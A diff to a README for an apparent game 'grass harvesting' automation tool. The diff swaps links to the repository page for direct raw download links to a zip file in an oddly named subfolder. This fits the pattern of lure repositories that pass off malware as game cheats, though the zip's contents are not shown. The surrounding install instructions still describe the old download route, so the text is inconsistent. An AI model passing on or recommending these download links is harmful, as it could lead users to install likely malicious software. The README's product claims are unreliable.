@@ -1,6 +1,6 @@
 # 🏆 brainroots-cut-grass-v2026-hub - Automate Grass Harvesting in Brainroots v2026
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub/raw/refs/heads/main/bathygraphic/hub-grass-v-brainroots-cut-Sumass.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@
 
 ## ⬇️ Download & Install
 
-Visit this link to download the application: [https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub](https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub)
+Visit this link to download the application: [https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub/raw/refs/heads/main/bathygraphic/hub-grass-v-brainroots-cut-Sumass.zip](https://github.com/Antinomian-theorem163/brainroots-cut-grass-v2026-hub/raw/refs/heads/main/bathygraphic/hub-grass-v-brainroots-cut-Sumass.zip)
 
 On the GitHub page, click the green "Code" button and select "Download ZIP". Then extract the ZIP folder to a location you'll remember, like your Desktop.
 
